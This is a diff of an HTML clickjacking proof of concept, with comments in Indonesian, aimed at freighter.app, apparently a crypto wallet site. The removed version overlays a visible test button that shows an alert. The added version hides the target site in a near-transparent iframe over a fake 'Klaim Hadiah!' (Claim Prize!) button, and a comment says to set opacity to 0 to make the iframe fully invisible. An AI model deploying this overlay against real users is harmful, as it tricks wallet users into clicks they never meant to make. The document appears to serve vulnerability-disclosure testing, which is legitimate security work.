@@ -1,39 +1,43 @@
 <!DOCTYPE html>
 <html>
 <head>
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<style>
-  body { background:#000; color:#fff; font-family: monospace; margin:0; padding:20px; }
-  .wrapper { position: relative; width: 420px; max-width: 90vw; height: 800px; margin: 20px auto; border: 2px solid #333; overflow: hidden; }
-  iframe { width: 100%; height: 100%; border:0; }
-  /* GANTI top/left/width/height ini untuk nge-pas-in */
-  .poc-button {
-    position: absolute;
-    /* posisi ini yang kamu sesuaikan - sekarang dipasin ke area kanan bawah (Get Android) */
-    top: 58%;
-    left: 52%;
-    width: 38%;
-    height: 10%;
-    z-index: 10;
-    background: rgba(255,0,80,0.4); /* untuk PoC jangan 0, biar reviewer lihat */
-    border: 2px dashed red;
-    color: white;
-    cursor: pointer;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-  }
-</style>
+    <style>
+        #target-container {
+            position: relative;
+            width: 500px;
+            height: 400px;
+        }
+        /* Tombol palsu yang dilihat pengguna */
+        .fake-btn {
+            position: absolute;
+            top: 150px;
+            left: 100px;
+            width: 120px;
+            height: 40px;
+            background-color: green;
+            color: white;
+            text-align: center;
+            line-height: 40px;
+            font-family: sans-serif;
+            z-index: 1;
+        }
+        /* Iframe target dibuat transparan */
+        iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 600px;
+            height: 500px;
+            opacity: 0.1; /* Ubah ke 0 untuk transparansi penuh */
+            z-index: 2;
+        }
+    </style>
 </head>
 <body>
-  <h3>Clickjacking Test - freighter.app</h3>
-  <p>Parent: 0x403for.github.io<br>Child: https://freighter.app/</p>
-
-  <div class="wrapper">
-    <iframe src="https://freighter.app/"></iframe>
-    <div class="poc-button" onclick="alert('Clicked - PoC Success')">INVISIBLE BUTTON DI SINI</div>
-  </div>
-
-  <p>Untuk final PoC ganti background jadi <code>opacity: 0.01</code>. Jangan pakai <code>opacity: 0</code> karena di beberapa browser tidak ke-click.</p>
+    <div id="target-container">
+        <div class="fake-btn">Klaim Hadiah!</div>
+        <!-- Muat halaman rentan ke dalam iframe -->
+        <iframe src="https://freighter.app/"></iframe>
+    </div>
 </body>
 </html>
